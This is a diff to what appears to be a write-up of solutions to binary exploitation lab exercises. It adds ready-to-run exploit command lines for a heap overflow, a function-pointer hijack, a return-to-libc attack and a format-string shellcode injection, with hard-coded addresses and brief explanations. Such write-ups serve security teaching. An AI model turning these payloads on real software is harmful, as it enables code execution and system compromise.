@@ -27,7 +27,22 @@ This was a tedious one.
 - Step 4: Hold the door open by piping in the shellcode + nopsled with '-' so that the keyboard remains interactive and end of input is not reached. If end of input is reached, shell instantly closes. 
 
 ## Heap Overflow 1
-./heap-arbitrary-overwrite $(perl -e 'printf "A" x 40')$(printf "\x9c\xcf\x0e\x08") $(perl -e 'printf "\x44\x33\x22\x11"')$(perl -e 'printf"B" x 32')
+Solution:  
+./heap-arbitrary-overwrite $(perl -e 'printf "A" x 40')$(printf "\x9c\xcf\x0e\x08") $(perl -e 'printf "\x44\x33\x22\x11"')$(perl -e 'printf"B" x 32')  
 
 ## Heap Overflow 2
+Solution:  
+./heap-hijack-funcptr $(perl -e 'printf "A" x 72')$(printf '\xdf\x89\x04\x08')  
+V simple; the size of the allocated space was 64 + 8 bytes, and overflow the next pointer to return into the shell 
+
+## Return to libc
+Solution:  
+./overflow $(perl -e 'print "AAAA"x764')AAAA$(printf "ABCDD\xa6\x85\x04\x08")$(printf "\x40\x6b\xe4\xf7")AAAA$(printf "\xc8\x8d\xf6\xf7")  
+The idea behind the attack is that because the stack is nonexecutable, you have to return to places in memory that are executable. 
+
+
+## Format String
+Solution:  
+./format $(perl -e 'print "\x41\xc0\xd2\xff\xff\xc1\xd2\xff\xff\xc2\xd2\xff\xff\xc3\xd2\xff\xff"')%$[0xfb-0x20]u%10\$n%$[0x184-0xfb]u%11\$n%$[0x204-0x184]u%12\$n%$[0x308-0x204]u%13\$n%271\$p.%272\$p.%273\$p.%274\$p.%275\$p  
+Inject shellcode and then point to it by manipulating format strings
 
